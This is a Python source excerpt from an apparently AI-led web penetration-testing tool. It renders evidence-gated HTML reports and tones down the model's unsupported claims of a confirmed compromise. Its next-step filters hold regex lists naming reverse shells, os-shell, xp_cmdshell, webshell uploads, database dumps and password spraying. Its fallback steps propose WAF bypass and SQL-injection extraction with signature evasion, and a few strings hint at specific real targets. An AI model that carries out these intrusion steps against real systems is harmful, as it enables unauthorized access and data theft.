        target: str,
        confirmed_count: int = 0,
        potential_count: int = 0,
        generated_at: str | None = None,
    ) -> str:
        """Render the evidence-gated markdown report as a polished standalone HTML file."""
        import html as _html
        import re as _html_re
        from datetime import datetime as _html_dt

        generated_at = generated_at or _html_dt.now().strftime("%Y-%m-%d %H:%M:%S")
        safe_target = _html.escape(target or "unknown")

        def _inline(text: str) -> str:
            out = _html.escape(text)
            out = _html_re.sub(r"\*\*(.+?)\*\*", r"<strong>\1</strong>", out)
            out = _html_re.sub(r"`([^`]+)`", r"<code>\1</code>", out)
            out = _html_re.sub(
                r"\b(BINGO-(?:Q)?\d{4})\b",
                r'<span class="finding-id">\1</span>',
                out,
            )
            severity_map = {
                "Critical": "critical",
                "CRITICAL": "critical",
                "High": "high",
                "HIGH": "high",
                "Medium": "medium",
                "MEDIUM": "medium",
                "Low": "low",
                "LOW": "low",
                "Confirmed": "confirmed",
                "CONFIRMED": "confirmed",
                "Potential": "potential",
                "POTENTIAL": "potential",
                "Probable": "potential",
                "PROBABLE": "potential",
                "Unconfirmed": "unconfirmed",
                "UNCONFIRMED": "unconfirmed",
            }
            for word, cls in severity_map.items():
                out = _html_re.sub(
                    rf"(?<![>\w-]){_html_re.escape(word)}(?![\w-])",
                    f'<span class="badge {cls}">{word}</span>',
                    out,
                )
            return out

        body: list[str] = []
        in_ul = False
        in_code = False
        in_section = False
        code_lines: list[str] = []

        def _close_ul() -> None:
            nonlocal in_ul
            if in_ul:
                body.append("</ul>")
                in_ul = False

        def _close_section() -> None:
            nonlocal in_section
            _close_ul()
            if in_section:
                body.append("</section>")
                in_section = False

        for raw in (md_text or "").splitlines():
            line = raw.rstrip()
            if line.strip().startswith("```"):
                if in_code:
                    body.append(
                        "<pre><code>"
                        + _html.escape("\n".join(code_lines))
                        + "</code></pre>"
                    )
                    code_lines = []
                    in_code = False
                else:
                    _close_ul()
                    in_code = True
                    code_lines = []
                continue
            if in_code:
                code_lines.append(line)
                continue

            if not line.strip():
                _close_ul()
                continue

            heading = _html_re.match(r"^(#{1,3})\s+(.+)$", line)
            if heading:
                _close_section()
                level = min(len(heading.group(1)), 3)
                title = _inline(heading.group(2).strip())
                if level == 1:
                    body.append(f'<h1 class="md-title">{title}</h1>')
                else:
                    body.append(f'<section class="report-card"><h{level}>{title}</h{level}>')
                    in_section = True
                continue

            bullet = _html_re.match(r"^\s*[-*]\s+(.+)$", line)
            if bullet:
                if not in_ul:
                    body.append("<ul>")
                    in_ul = True
                body.append(f"<li>{_inline(bullet.group(1).strip())}</li>")
                continue

            numbered = _html_re.match(r"^\s*(\d+)[.)]\s+(.+)$", line)
            if numbered:
                if not in_ul:
                    body.append("<ul>")
                    in_ul = True
                body.append(
                    f'<li><span class="step-no">{numbered.group(1)}</span> '
                    f"{_inline(numbered.group(2).strip())}</li>"
                )
                continue

            body.append(f"<p>{_inline(line)}</p>")

        if in_code:
            body.append("<pre><code>" + _html.escape("\n".join(code_lines)) + "</code></pre>")
        _close_section()

        html_body = "\n".join(body)
        return f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Bingo Security Report - {safe_target}</title>
  <style>
    :root {{
      --bg: #071018;
      --card: rgba(13, 22, 35, .86);
      --card2: rgba(8, 15, 26, .92);
      --line: rgba(108, 255, 178, .24);
      --mint: #6cffb2;
      --blue: #35d6ff;
      --violet: #b388ff;
      --yellow: #ffd600;
      --red: #ff4d6d;
      --text: #e8f3ff;
      --muted: #8ea1b7;
      --shadow: 0 24px 80px rgba(0, 0, 0, .45);
    }}
    * {{ box-sizing: border-box; }}
    body {{
      margin: 0;
      color: var(--text);
      background:
        radial-gradient(circle at 15% 12%, rgba(53, 214, 255, .18), transparent 30%),
        radial-gradient(circle at 85% 8%, rgba(179, 136, 255, .20), transparent 28%),
        radial-gradient(circle at 50% 95%, rgba(108, 255, 178, .10), transparent 36%),
        var(--bg);
      font: 15px/1.65 -apple-system, BlinkMacSystemFont, "Segoe UI", Inter, Roboto, sans-serif;
      min-height: 100vh;
    }}
    .shell {{ width: min(1120px, calc(100vw - 40px)); margin: 34px auto 56px; }}
    .hero {{
      border: 1px solid var(--line);
      background: linear-gradient(145deg, rgba(13,22,35,.96), rgba(7,16,24,.82));
      border-radius: 28px;
      padding: 30px;
      box-shadow: var(--shadow);
      position: relative;
      overflow: hidden;
    }}
    .hero:before {{
      content: "";
      position: absolute;
      inset: 0;
      background: linear-gradient(90deg, transparent, rgba(108,255,178,.08), transparent);
      transform: translateX(-70%);
      pointer-events: none;
    }}
    .brand {{ color: var(--mint); letter-spacing: .18em; font-size: 12px; font-weight: 800; }}
    .hero h1 {{ margin: 10px 0 8px; font-size: clamp(32px, 5vw, 54px); line-height: 1.05; }}
    .hero .target {{ color: var(--blue); word-break: break-all; }}
    .meta {{ color: var(--muted); display: flex; gap: 14px; flex-wrap: wrap; }}
    .metrics {{ display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 14px; margin: 18px 0 24px; }}
    .metric {{
      border: 1px solid rgba(53, 214, 255, .18);
      background: var(--card);
      border-radius: 18px;
      padding: 16px 18px;
    }}
    .metric .label {{ color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: .12em; }}
    .metric .value {{ font-size: 28px; font-weight: 800; margin-top: 4px; }}
    .metric.confirmed .value {{ color: var(--mint); }}
    .metric.potential .value {{ color: var(--yellow); }}
    .metric.mode .value {{ color: var(--violet); font-size: 20px; }}
    .report-card {{
      border: 1px solid rgba(108, 255, 178, .18);
      background: var(--card2);
      border-radius: 22px;
      padding: 22px 24px;
      margin: 16px 0;
      box-shadow: 0 18px 54px rgba(0,0,0,.26);
    }}
    .report-card h2, .report-card h3 {{ margin: 0 0 14px; color: var(--blue); }}
    .md-title {{ display: none; }}
    p {{ margin: 10px 0; }}
    ul {{ margin: 8px 0 0; padding: 0; list-style: none; }}
    li {{ margin: 9px 0; padding-left: 24px; position: relative; }}
    li:before {{ content: "▸"; position: absolute; left: 0; color: var(--mint); }}
    code {{
      color: #d6faff;
      background: rgba(53, 214, 255, .10);
      border: 1px solid rgba(53, 214, 255, .14);
      border-radius: 7px;
      padding: 1px 6px;
    }}
    pre {{
      overflow: auto;
      border-radius: 16px;
      padding: 16px;
      background: #050b12;
      border: 1px solid rgba(108, 255, 178, .16);
    }}
    pre code {{ background: transparent; border: 0; padding: 0; color: #d9fff0; }}
    strong {{ color: #ffffff; }}
    .finding-id {{
      display: inline-block;
      color: #061018;
      background: linear-gradient(90deg, var(--mint), var(--blue));
      border-radius: 999px;
      padding: 1px 8px;
      font-weight: 800;
      letter-spacing: .03em;
    }}
    .badge {{
      display: inline-block;
      border-radius: 999px;
      padding: 1px 8px;
      font-size: .82em;
      font-weight: 800;
      border: 1px solid currentColor;
    }}
    .badge.critical {{ color: var(--red); }}
    .badge.high {{ color: var(--yellow); }}
    .badge.medium {{ color: #ff9f43; }}
    .badge.low {{ color: var(--blue); }}
    .badge.confirmed {{ color: var(--mint); }}
    .badge.potential, .badge.unconfirmed {{ color: var(--yellow); }}
    .step-no {{ color: var(--violet); font-weight: 800; margin-right: 6px; }}
    footer {{ margin-top: 24px; color: var(--muted); text-align: center; font-size: 12px; }}
    @media (max-width: 780px) {{
      .shell {{ width: min(100vw - 24px, 1120px); margin-top: 16px; }}
      .hero {{ padding: 22px; border-radius: 22px; }}
      .metrics {{ grid-template-columns: 1fr; }}
    }}
    @media print {{
      body {{ background: white; color: #121821; }}
      .hero, .metric, .report-card {{ box-shadow: none; background: white; color: #121821; }}
      .report-card, .metric, .hero {{ border-color: #cfd8e3; }}
    }}
  </style>
</head>
<body>
  <main class="shell">
    <header class="hero">
      <div class="brand">BINGO · SECURITY REPORT</div>
      <h1>Evidence-driven assessment</h1>
      <div class="target">{safe_target}</div>
      <div class="meta">
        <span>Generated: {_html.escape(generated_at)}</span>
        <span>Report truth: Finding-ID ledger</span>
      </div>
    </header>
    <section class="metrics">
      <div class="metric confirmed"><div class="label">Confirmed</div><div class="value">{int(confirmed_count)}</div></div>
      <div class="metric potential"><div class="label">Probable / Potential</div><div class="value">{int(potential_count)}</div></div>
      <div class="metric mode"><div class="label">Mode</div><div class="value">Hybrid AI-led</div></div>
    </section>
    {html_body}
    <footer>Generated by bingo · Markdown and HTML reports share the same evidence-gated source.</footer>
  </main>
</body>
</html>
"""

    @staticmethod
    def _sanitize_ground_truth_claims(
        text: str,
        confirmed_count: int = 0,
        potential_count: int = 0,
    ) -> str:
        """v6.2.177 Type A: Evidence Ladder 기반 문구 교정.

        confirmed_count>0 → 교정 안 함 (已确认 허용)
        potential/probable>0 → 已确认만 降级, 취약점 서술은 유지
        둘 다 0 → Confirmed/Critical 과장 전부 제거
        """
        if not text:
            return text
        import re as _re_sr
        if confirmed_count > 0:
            return text
        # 확정 표현만 교정 (실탐 potential/probable 서술은 보존)
        _repls = [
            (r'✅\s*已确认', '⚠ Probable/Potential'),
            (r'已确认（存在性验证成功[^）]*）', '未确认（ladder≠confirmed）'),
            (r'已确认\(存在性验证成功[^)]*\)', '未确认(ladder≠confirmed)'),
            (r'상태：✅\s*已确认', '상태：⚠ Probable'),
            (r'状态：✅\s*已确认', '状态：⚠ Probable'),
            (r'✅\s*CONFIRMED', '⚠ PROBABLE'),
            (r'\bCONFIRMED\b(?!\s*=)', 'PROBABLE'),
            (r'✅\s*확인됨', '⚠ 미확정(probable)'),
        ]
        if potential_count <= 0:
            _repls.extend([
                (r'已确认dswhosp[^\s，。]*', '未确认(WAF/Oracle)'),
                (r'已确认.{0,40}(?:布尔盲|SQL\s*注入|布尔盲注)', '未确认 SQL注入(WAF阻断)'),
                (r'已确认', '未确认'),
                (r'확인된', '미확인'),
                (r'\bCritical\b(?!\s*Potential)', 'Potential'),
                (r'\bCRITICAL\b(?!\s*POTENTIAL)', 'POTENTIAL'),
                (r'严重\s*[:：]?\s*Critical', '严重：Potential'),
                (r'심각도\s*[:：]?\s*Critical', '심각도：Potential'),
                (r'🔴\s*Critical', '⚠ Potential'),
                (r'🔴\[#ff1744\]Critical', '⚠ Potential'),
            ])
        else:
            _repls.extend([
                (r'已确认', 'Probable(未达confirmed)'),
                (r'\bCritical\b(?!\s*Potential)', 'Potential'),
                (r'\bCRITICAL\b(?!\s*POTENTIAL)', 'POTENTIAL'),
                (r'🔴\s*Critical', '⚠ Potential'),
            ])
        out = text
        for pat, rep in _repls:
            out = _re_sr.sub(pat, rep, out)
        return out

    @staticmethod
    def _sanitize_report_confirmed_claims(
        report: str,
        confirmed_count: int = 0,
        potential_count: int = 0,
    ) -> str:
        """하위 호환 래퍼 → _sanitize_ground_truth_claims."""
        return BingoTerminal._sanitize_ground_truth_claims(
            report, confirmed_count, potential_count=potential_count
        )

    @staticmethod
    def _finding_evidence_counts(exporter) -> dict[str, int]:
        """Return evidence-ledger counts used to gate completion/confirmation."""
        counts = {
            "confirmed": 0,
            "probable": 0,
            "potential": 0,
            "blocked": 0,
            "quarantined": 0,
        }
        if exporter is None:
            return counts
        try:
            stats = exporter.stats() if hasattr(exporter, "stats") else {}
            counts["confirmed"] = int(stats.get("confirmed", 0) or 0)
            counts["probable"] = int(stats.get("probable", 0) or 0)
            counts["potential"] = max(
                int(stats.get("potential", 0) or 0),
                int(stats.get("potential_critical", 0) or 0)
                + int(stats.get("potential_high", 0) or 0),
            )
            counts["blocked"] = int(stats.get("blocked", 0) or 0)
            counts["quarantined"] = int(stats.get("quarantined", 0) or 0)
            return counts
        except Exception:
            pass

        try:
            for finding in list(getattr(exporter, "findings", []) or []):
                confidence = str(getattr(finding, "confidence", "") or "").lower()
                if bool(getattr(finding, "confirmed", False)) or confidence == "confirmed":
                    counts["confirmed"] += 1
                elif confidence == "probable":
                    counts["probable"] += 1
                elif confidence in {"potential", "inconclusive"}:
                    counts["potential"] += 1
                elif confidence == "blocked":
                    counts["blocked"] += 1
            counts["quarantined"] = len(list(getattr(exporter, "quarantined", []) or []))
        except Exception:
            pass
        return counts

    @staticmethod
    def _response_has_executable_intent(text: str) -> bool:
        """Return True when a model response still contains runnable next action.

        This is used only to arbitrate auto-report completion.  It does not
        block tools, payloads, skills, or attack logic; it prevents a premature
        TASK_COMPLETE from winning over pending execution.
        """
        if not text:
            return False
        import re as _intent_re
        if _intent_re.search(r"\bTOOL_CALL\s*:", text):
            return True
        if _intent_re.search(r"<tool_call\b", text, _intent_re.I):
            return True
        if _intent_re.search(r"```(?:bash|sh|zsh|python)\b", text, _intent_re.I):
            return True
        if "[bingo action]" in text:
            return True
        if ("TOOL_CALL" + "_SUMMARY") in text:
            return True
        return False

    @staticmethod
    def _auto_report_defer_reason(
        response: str,
        evidence_counts: dict[str, int] | None,
        loop_count: int,
        *,
        trigger: str = "task_complete",
    ) -> str:
        """Explain why automatic report generation should be deferred.

        Manual report generation and explicit hard stops stay untouched.  This
        guard only handles model-authored completion signals and no-code
        fallbacks, where hallucinated completion can otherwise end a scan before
        any usable evidence exists.
        """
        counts = evidence_counts or {}
        confirmed = int(counts.get("confirmed", 0) or 0)
        probable = int(counts.get("probable", 0) or 0)
        potential = int(counts.get("potential", 0) or 0)
        evidence_total = confirmed + probable + potential

        if trigger in {"manual_report", "loop_limit", "user_interrupt", "target_failed", "web3"}:
            return ""
        if confirmed > 0:
            return ""
        if BingoTerminal._response_has_executable_intent(response):
            return "pending executable action exists"
        if trigger == "no_code_retry" and evidence_total == 0:
            return "no executable evidence has been collected"
        if evidence_total == 0 and int(loop_count or 0) < 8:
            return "no findings exist and the scan is still in early reconnaissance"
        return ""

    @staticmethod
    def _sanitize_runtime_claims_by_evidence(text: str, exporter) -> str:
        """Downgrade runtime narrative claims that outrun the local evidence ledger.

        Code blocks and TOOL_CALL payloads are preserved so attack capability is
        not reduced; only the model's natural-language confidence wording is
        grounded to the Finding evidence ladder.
        """
        if not text:
            return text
        counts = BingoTerminal._finding_evidence_counts(exporter)
        if counts["confirmed"] > 0:
            return text

        import re as _rt_re

        potential_count = counts["probable"] + counts["potential"] + counts["blocked"]
        parts = _rt_re.split(r'(```[\s\S]*?```)', text)
        for index in range(0, len(parts), 2):
            parts[index] = BingoTerminal._sanitize_ground_truth_claims(
                parts[index],
                confirmed_count=0,
                potential_count=potential_count,
            )
        return "".join(parts)

    @staticmethod
    def _build_evidence_based_next_steps(
        lang: str,
        flags: dict,
        confirmed_count: int = 0,
        potential_count: int = 0,
    ) -> tuple[str, list[str]]:
        """Build a deterministic next-step menu from the evidence ladder.

        This is used as a hard fallback when the next-step model writes
        unsupported post-exploit claims such as "DB/hash/admin obtained" while
        the local findings exporter has zero confirmed findings.
        """
        blocked = int(flags.get("blocked_count", 0) or 0)
        has_potential_sqli = bool(flags.get("has_potential_sqli") or potential_count > 0 or blocked > 0)
        has_admin_panel = bool(flags.get("has_admin_panel"))

        if lang == "zh":
            if confirmed_count > 0:
                summary = "已有 confirmed 级别发现；下一步应围绕已确认证据继续扩展验证。"
            elif has_potential_sqli:
                summary = "当前没有 confirmed 级别漏洞；现有 SQLi/WAF 迹象只能作为未确认验证队列处理，不能使用 DB/哈希/shell/高权限控制已完成的表述。"
            else:
                summary = "当前没有 confirmed 级别漏洞；下一步应重新建立 baseline 并寻找新的可验证输入面。"
            options = [
                "重新校准目标页面 baseline 后复测 SQLi/WAF oracle，要求稳定 TRUE/FALSE 或时间差证据",
                "枚举同一域名下的 JS/API 端点，寻找新的参数和未授权接口",
                "对登录后对象 ID、订单号、 게시판 wr_id 等参数做 IDOR 边界验证",
                "切换到 LFI/路径遍历候选复测，但只有出现目标文件内容时才升级为发现",
                "检查公开后台路径可访问性并记录状态，不假设默认凭据或已取得管理员权限",
            ]
        elif lang == "ko":
            if confirmed_count > 0:
                summary = "confirmed 등급 발견이 있으므로, 다음 단계는 확정 증거를 기준으로 확장 검증해야 한다."
            elif has_potential_sqli:
                summary = "현재 confirmed 취약점은 없다. SQLi/WAF 징후는 미확정 검증 대기 항목이며 DB, 해시, shell, 관리자 권한 획득으로 쓰면 안 된다."
            else:
                summary = "현재 confirmed 취약점은 없다. baseline을 다시 잡고 검증 가능한 새 입력면을 찾아야 한다."
            options = [
                "목표 페이지 baseline을 재보정한 뒤 SQLi/WAF oracle을 재검증한다",
                "같은 도메인의 JS/API 엔드포인트를 열거해 새 파라미터와 미인증 인터페이스를 찾는다",
                "로그인 후 객체 ID, 주문번호, 게시판 wr_id 계열 파라미터로 IDOR 경계를 검증한다",
                "LFI/경로순회 후보를 재검증하되 실제 파일 내용이 나올 때만 발견으로 승격한다",
                "공개 관리자 경로 접근성만 확인하고 기본 자격증명이나 관리자 획득은 가정하지 않는다",
            ]
        else:
            if confirmed_count > 0:
                summary = "Confirmed findings exist; continue from the verified evidence only."
            elif has_potential_sqli:
                summary = "No confirmed vulnerability exists yet. SQLi/WAF signals are unconfirmed verification backlog items, not proof of database, hash, shell, or admin access."
            else:
                summary = "No confirmed vulnerability exists yet. Rebuild the baseline and look for new independently verifiable input surfaces."
            options = [
                "Recalibrate the target baseline, then re-test SQLi/WAF oracle with stable TRUE/FALSE or timing evidence",
                "Enumerate same-domain JS/API endpoints for new parameters and unauthenticated interfaces",
                "Verify IDOR boundaries on authenticated object IDs, order IDs, and board record IDs",
                "Re-test LFI/path traversal candidates and promote only when exact target file content appears",
                "Check public admin-path reachability only; do not assume default credentials or admin access",
            ]

        if not has_admin_panel:
            # Keep the path-reachability item but make its non-assumption explicit.
            options = [
                opt.replace("检查公开后台路径可访问性并记录状态，不假设默认凭据或已取得管理员权限",
                            "枚举公开管理路径是否存在；若仅有登录页，只记录为 login_form_only")
                .replace("공개 관리자 경로 접근성만 확인하고 기본 자격증명이나 관리자 획득은 가정하지 않는다",
                         "공개 관리자 경로 존재 여부만 확인한다. 로그인 페이지만 있으면 login_form_only로 기록한다")
                .replace("Check public admin-path reachability only; do not assume default credentials or admin access",
                         "Enumerate public admin paths; if only a login page exists, record login_form_only")
                for opt in options
            ]
        return summary, options

    @staticmethod
    def _sanitize_next_step_summary(
        summary: str,
        flags: dict,
        lang: str,
        confirmed_count: int = 0,
        potential_count: int = 0,
    ) -> str:
        """Evidence-gate the interactive post-report progress summary."""
        if not summary:
            return summary
        import re as _re_nss

        out = BingoTerminal._sanitize_ground_truth_claims(
            summary,
            confirmed_count=confirmed_count,
            potential_count=potential_count,
        )
        if confirmed_count > 0:
            return out

        unsupported_takeover_claim = bool(_re_nss.search(
            r'(?:已通过|通过|获取|获得|拿到|提取|导出|dump(?:ed)?|extract(?:ed)?|'
            r'obtain(?:ed)?|acquir(?:ed|e)|획득|추출|덤프|확보)'
            r'.{0,80}'
            r'(?:数据库|DB\b|database|SinkDB|g5_member|哈希|hash|管理员|admin|'
            r'凭据|credential|shell|webshell|관리자|해시|자격증명)',
            out,
            _re_nss.I,
        ))
        unsupported_access_claim = bool(_re_nss.search(
            r'(?:shell|webshell|RCE|命令执行|系统命令|관리자|admin\s+access|'
            r'管理员权限|root\s+shell|os-shell)',
            out,
            _re_nss.I,
        ))
        if unsupported_takeover_claim or unsupported_access_claim:
            safe_summary, _ = BingoTerminal._build_evidence_based_next_steps(
                lang,
                flags,
                confirmed_count=confirmed_count,
                potential_count=potential_count,
            )
            return safe_summary
        return out

    @staticmethod
    def _filter_verified_report_credentials(session_credentials: list) -> list:
        """Keep only credentials with enough structure for report output.

        A single password candidate from a login attempt (for example
        "Password: cheomdan") is not a credential.  It is only a tested input
        unless paired with an account and success/extraction evidence.
        """
        import re as _cred_re

        filtered: list = []
        for item in session_credentials or []:
            if isinstance(item, dict):
                lowered = {str(k).lower(): str(v).strip() for k, v in item.items()}
                user = lowered.get("username") or lowered.get("user") or lowered.get("mb_id") or lowered.get("id")
                password = lowered.get("password") or lowered.get("passwd") or lowered.get("pwd") or lowered.get("mb_password")
                verified = str(
                    lowered.get("verified")
                    or lowered.get("success")
                    or lowered.get("status")
                    or lowered.get("source")
                    or lowered.get("evidence")
                    or ""
                ).lower()
                if user and password:
                    filtered.append(item)
                elif password and any(tok in verified for tok in ("confirmed", "success", "dump", "extract", "valid")):
                    filtered.append(item)
                continue

            text = str(item).strip()
            if not text:
                continue
            low = text.lower()
            has_user = bool(_cred_re.search(r'\b(?:user(?:name)?|mb_id|login|account)\b\s*[:=]', low))
            has_pass = bool(_cred_re.search(r'\b(?:pass(?:word)?|passwd|pwd|mb_password)\b\s*[:=]', low))
            verified_text = bool(_cred_re.search(
                r'confirmed|login\s+success|valid\s+credential|credential\s+extracted|'
                r'dumped|extracted|로그인\s*성공|登录成功|凭据提取',
                low,
            ))
            if has_user and has_pass and verified_text:
                filtered.append(item)
        return filtered

    @staticmethod
    def _validate_report_finding_ids(report: str, findings: list) -> tuple[bool, list[str]]:
        """Reject report claims that are not backed by an active Finding ID."""
        import re as _report_re

        active = [
            finding
            for finding in findings
            if getattr(finding, "confidence", "") not in ("blocked", "quarantined")
        ]
        allowed_ids = {str(getattr(finding, "id", "")) for finding in active}
        findings_by_id = {
            str(getattr(finding, "id", "")): finding
            for finding in active
        }
        allowed_types = {str(getattr(finding, "vuln_type", "")) for finding in active}
        aliases = {
            "sqli": r'sqli|sql\s*(?:injection|注入|인젝션)',
            "xss": r'\bxss\b|cross.?site|跨站脚本|크로스.?사이트',
            "ssrf": r'\bssrf\b|服务端请求伪造|서버.?사이드.?요청',
            "lfi": r'\b(?:lfi|rfi)\b|文件包含|파일.?포함',
            "rce": r'\brce\b|remote.?code.?execution|远程代码执行|원격.?코드.?실행',
            "auth_bypass": r'auth.?bypass|认证绕过|인증.?우회',
            "credential": r'credential|凭据|자격.?증명',
            "info_disclosure": r'information.?disclosure|信息泄露|정보.?노출',
            "open_redirect": r'open.?redirect|开放重定向|오픈.?리다이렉트',
            "idor": r'\bidor\b|水平越权|수평.?권한',
            "cors": r'\bcors\b',
            "csrf": r'\bcsrf\b',
        }
        unsupported: list[str] = []
        item_pattern = _report_re.compile(
            r'(?ms)^\s*\d+[.)]\s*\*\*(.+?)\*\*(.*?)(?=^\s*\d+[.)]\s*\*\*|^##\s|\Z)'
        )
        for match in item_pattern.finditer(report or ""):
            title, body = match.group(1), match.group(2)
            segment = title + "\n" + body
            item_types = {
                vtype
                for vtype, pattern in aliases.items()
                if _report_re.search(pattern, title, _report_re.I)
            }
            for vtype in item_types:
                if vtype not in allowed_types:
                    unsupported.append(f"unsupported_type:{vtype}")
            ids = set(_report_re.findall(r'BINGO-(?:Q)?\d{4}', segment, _report_re.I))
            if not ids:
                unsupported.append(f"missing_finding_id:{title[:40]}")
            elif not ids.issubset(allowed_ids):
                unsupported.append(f"unknown_finding_id:{','.join(sorted(ids - allowed_ids))}")
            else:
                unresolved_ids = {
                    finding_id
                    for finding_id in ids
                    if getattr(findings_by_id[finding_id], "confidence", "") != "confirmed"
                }
                explicitly_unconfirmed = bool(_report_re.search(
                    r'\b(?:potential|probable|unconfirmed|candidate)\b'
                    r'|미확정|잠재|추정|待验证|潜在|未确认',
                    segment,
                    _report_re.I,
                ))
                if unresolved_ids and not explicitly_unconfirmed:
                    unsupported.append(
                        f"unconfirmed_claim:{','.join(sorted(unresolved_ids))}"
                    )
        if not allowed_ids and item_pattern.search(report or ""):
            unsupported.append("claims_without_findings")
        return not unsupported, sorted(set(unsupported))

    @staticmethod
    def _filter_next_steps_by_evidence(options: list, flags: dict) -> list:
        """v6.2.175/176 Type A: 증거 없는 고위험 next_steps 제거.
        SQLi potential/confirmed 검증·WAF 우회 제안은 절대 제거하지 않음.
        """
        import re as _re_ns
        if not options:
            return options
        out = []
        _keep_sqli = bool(
            flags.get("has_confirmed_sqli")
            or flags.get("has_potential_sqli")
            or flags.get("blocked_count")  # blocked여도 우회 재시도 유지
        )
        _has_confirmed_sqli = bool(flags.get("has_confirmed_sqli"))
        _has_real_cred = bool(flags.get("has_real_cred"))
        _has_upload = bool(flags.get("has_upload"))
        _has_admin_panel = bool(flags.get("has_admin_panel"))
        for opt in options:
            low = (opt or "").lower()
            # Post-exploit/data-extraction actions require confirmed upstream evidence.
            # Keep verification/retest options, but remove "os-shell / admin insert /
            # DB dump / hash cracking" when the evidence ladder has not confirmed SQLi
            # or a real credential.
            _needs_confirmed_sqli = bool(_re_ns.search(
                r'os-?shell|--os-shell|xp_cmdshell|whoami|命令执行|系统命令|'
                r'rce\b|remote\s+code|getshell|反弹\s*shell|reverse\s+shell|'
                r'堆叠查询|stacked\s+quer|insert.{0,40}admin|admin\s+account|'
                r'插入.{0,40}管理员|新管理员|관리자.{0,20}생성|관리자.{0,20}삽입|'
                r'into\s+outfile|load_file\s*\(|写入|写文件|파일\s*쓰기',
                low,
                _re_ns.I,
            ))
            _needs_extracted_secret = bool(_re_ns.search(
                r'获取.{0,30}数据库|提取.{0,30}数据库|导出.{0,30}数据库|'
                r'dump.{0,30}(?:db|database|table)|database\s+dump|'
                r'g5_member|mysql\.user|管理员.{0,20}哈希|admin.{0,20}hash|'
                r'password\s*hash|哈希|해시|hash\s+crack|비밀번호\s*크랙',
                low,
                _re_ns.I,
            ))
            if _needs_confirmed_sqli and not (_has_confirmed_sqli or _has_upload):
                continue
            if _needs_extracted_secret and not (_has_confirmed_sqli or _has_real_cred):
                continue
            _needs_admin_or_cred_surface = bool(_re_ns.search(
                r'default\s+(?:cred|password)|默认凭据|默认密码|简单密码|弱口令|'
                r'admin/admin|credential\s*stuff|撞库|password\s*spray|brute\s*force|'
                r'기본\s*(?:암호|비밀번호)|약한\s*비밀번호',
                low,
                _re_ns.I,
            ))
            if _needs_admin_or_cred_surface and not (_has_admin_panel or _has_real_cred):
                continue
            # SQLi/WAF 우회/oracle 재검증 — 실탐 누락 방지: 항상 유지
            _is_sqli_path = bool(_re_ns.search(
                r'sqli|sql\s*注入|布尔|블라인드|blind|oracle|waf|우회|绕过'
                r'|benchmark|sleep|extractvalue|updatexml|substring|시간\s*맹',
                low, _re_ns.I
            ))
            if _is_sqli_path:
                if not flags.get("has_confirmed_sqli"):
                    opt = _re_ns.sub(
                        r'已确认|confirmed\s+sqli|확인된\s*sqli',
                        '潜在(potential)',
                        opt,
                        flags=_re_ns.I,
                    )
                out.append(opt)
                continue
            # 웹쉘/업로드 — 업로드 기능 증거 없으면 제거
            if _re_ns.search(
                r'webshell|웹쉘|web\s*shell|파일\s*업로드|upload\s*(?:shell|webshell|php|phtml)|phtml|getshell',
                low, _re_ns.I
            ) and not flags.get("has_upload"):
                continue
            # 撞库 / 가짜 aaa — 실자격증명 없으면 제거
            if _re_ns.search(
                r'撞库|credential\s*stuff|비밀번호\s*크랙|password\s*crack'
                r'|mb_id\s*[\'"]?aaa|계정\s*[\'"]?aaa[\'"]?|default\s*password'
                r'|기본\s*암호|기본\s*비밀번호',
                low, _re_ns.I
            ) and not flags.get("has_real_cred"):
                continue
            out.append(opt)
        if not out:
            if _keep_sqli:
                out = [
                    "Re-test boolean oracle / WAF bypass (potential SQLi — do not drop)",
                    "Try time-based or error-based extraction with signature evasion",
                    "Enumerate JS/API endpoints for unauthenticated access",
                ]
            else:
                out = [
                    "Enumerate JS/API endpoints for unauthenticated access",
                    "Map application paths without assuming SQLi confirmed",
                    "Recon auth/session surfaces",
                ]
        return out[:5]

    @staticmethod
    def _build_fallback_report(
        target: str,
        lang: str,
        confirmed_count: int,
        potential_count: int,
        ground_truth: str,
        session_credentials: list,
    ) -> str:
        """Build a deterministic report when the report LLM is unavailable."""
        labels = {
            "ko": ("요약", "발견된 취약점", "증거 (페이로드)", "추출된 자격증명", "권고 조치"),
            "zh": ("摘要", "发现的漏洞", "证据（载荷）", "提取的凭据", "修复建议"),
            "en": ("Summary", "Vulnerabilities Found", "Evidence (Payloads)", "Credentials Extracted", "Recommended Fix"),
        }
        summary, vulns, evidence, creds, fixes = labels.get(lang, labels["en"])
        no_creds = {"ko": "- 이번 세션에서 확인된 자격증명 없음", "zh": "- 本次会话未确认凭据", "en": "- No credentials confirmed in this session"}
        fallback_note = {
            "ko": "모델 보고서 생성 실패로 로컬 증거 기반 fallback 보고서를 생성했습니다.",
            "zh": "报告模型不可用，已根据本地证据生成 fallback 报告。",
            "en": "The report model was unavailable; this fallback was generated from local evidence.",
        }.get(lang, "Fallback report generated from local evidence.")
        metrics = {
            "ko": ("확정", "추정/잠재"),
            "zh": ("已确认", "推定/潜在"),
            "en": ("Confirmed", "Probable/Potential"),
        }.get(lang, ("Confirmed", "Probable/Potential"))
        session_credentials = BingoTerminal._filter_verified_report_credentials(session_credentials)
        credential_lines = (
            "\n".join(f"- {item}" for item in session_credentials)
            if session_credentials else no_creds.get(lang, no_creds["en"])
        )
        truth_lines = [
            line.strip()
            for line in ground_truth.splitlines()
            if line.strip().startswith("- id=")
        ]
        confirmed_truth = [line for line in truth_lines if "tier=confirmed" in line]
        backlog_truth = [line for line in truth_lines if "tier=confirmed" not in line]
        backlog_blob = "\n".join(backlog_truth).lower()
        lang_strings = get_strings(lang)

        def _report_msg(key: str, default: str) -> str:
            value = lang_strings.get(key, default)
            if isinstance(value, dict):
                return value.get(lang, value.get("en", default))
            return str(value)

        def _fallback_fix_lines() -> str:
            if not backlog_truth:
                return "- " + _report_msg(
                    "report_fix_no_verified",
                    "No verified vulnerabilities. Maintain defensive baselines.",
                ) + "\n"
            lines: list[str] = []
            if "tier=blocked" in backlog_blob:
                lines.append(_report_msg(
                    "report_fix_blocked",
                    "Re-establish a clean baseline/session for blocked items.",
                ))
            if "xss" in backlog_blob and ("quarantined" in backlog_blob or "potential" in backlog_blob):
                lines.append(_report_msg(
                    "report_fix_xss_browser",
                    "Confirm XSS candidates with browser execution evidence.",
                ))
            if "sqli" in backlog_blob and ("tier=probable" in backlog_blob or "tier=potential" in backlog_blob):
                lines.append(_report_msg(
